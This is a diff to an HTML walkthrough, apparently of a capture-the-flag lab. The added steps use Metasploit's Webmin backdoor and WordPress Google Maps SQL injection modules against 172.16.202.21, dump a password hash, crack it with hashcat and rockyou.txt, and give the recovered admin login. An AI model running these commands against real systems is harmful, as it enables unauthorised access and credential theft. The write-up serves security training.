@@ -72,7 +72,8 @@
         <div class="step">
             <p>4. Just googling this version of Webmin shows a bunch of vulnerabilities, so we immediately turned to
                 Metasploit.</p>
-            <span class="step-note">Related: <a href="/metasploit5-on-kali-linux.html" target="_blank">Metasploit 5 on Kali Linux</a>.</span>
+            <span class="step-note">Related: <a href="/metasploit5-on-kali-linux.html" target="_blank">Metasploit 5 on
+                    Kali Linux</a>.</span>
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
@@ -175,7 +176,7 @@
                     <span class="prompt">msf5 > </span>
                     <code>use exploit/unix/webapp/webmin_backdoor</code>
                 </div>
-                <br/>
+                <br />
                 <div class="code-line">
                     <span class="prompt">msf5 exploit(unix/webapp/webmin_backdoor) ></span>
                     <code>set RHOSTS 172.16.202.21</code>
@@ -212,6 +213,80 @@
             </div>
         </div>
 
+        <div class="step">
+            <p>8. This scan showed multiple exploitable vulnerabilities but the most promising seemed to be a <a
+                    href="https://www.rapid7.com/db/modules/auxiliary/admin/http/wp_google_maps_sqli"
+                    target="_blank">Google Maps Plugin SQL Injection</a>. So, once again, we returned to Metasploit.</p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>service postgresql start</code>
+                </div>
+                <br />
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>msfconsole</code>
+                </div>
+                <div class="code-line">
+                    <code>...</code>
+                </div>
+                <br />
+                <div class="code-line">
+                    <span class="prompt">msf5 > </span>
+                    <code>db_status</code>
+                </div>
+                <div class="code-line">
+                    <code>[*] Connected to msf. Connection type: postgresql.</code>
+                </div>
+                <br />
+                <div class="code-line">
+                    <span class="prompt">msf5 > </span>
+                    <code>use auxiliary/admin/http/wp_google_maps_sqli </code>
+                </div>
+                <br />
+                <div class="code-line">
+                    <span class="prompt">msf5 (auxiliary/admin/http/wp_google_maps_sqli) ></span>
+                    <code>set RHOSTS 172.16.202.21 </code>
+                </div>
+                <div class="code-line">
+                    <span class="prompt">msf5 (auxiliary/admin/http/wp_google_maps_sqli) ></span>
+                    <code>exploit </code>
+                </div>
+                <br />
+                <div class="code-line">
+                    <code>[*] Running module against 172.16.202.21</code>
+                </div>
+                <div class="code-line">
+                    <code>[*] 172.16.202.21:80 - Trying to retrieve the wp_users table...</code>
+                </div>
+                <div class="code-line">
+                    <code>[*] 172.16.202.21:80 - Trying to retrieve the wp_users table...</code>
+                </div>
+                <div class="code-line">
+                    <code>[+] Credentials saved in: /root/.msf4/loot/20191122164904_default_172.16.202.21_wp_google_maps.j_463939.bin</code>
+                </div>
+                <div class="code-line">
+                    <code>[+] 172.16.202.21:80 - <span style="color: red;">Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local</span></code>
+                </div>
+                <div class="code-line">
+                    <code>[*] Auxiliary module execution completed</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>9. Finally, we used hashcat to crack the password: <strong>kittykat1</strong></p>
+            <div class="code-block">
+                <div class="code-line">
+                    <span class="prompt">root@kali:/#</span>
+                    <code>hashcat -m 400 -a 0 hash.txt Desktop/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt</code>
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <p>10. Now we have the credentials to the login to the WP <a href="http://172.16.202.21/wp-admin" target="_blank">admin console</a>: webmaster/kittykat1</p>
+        </div>
 
     </article>
 </body>
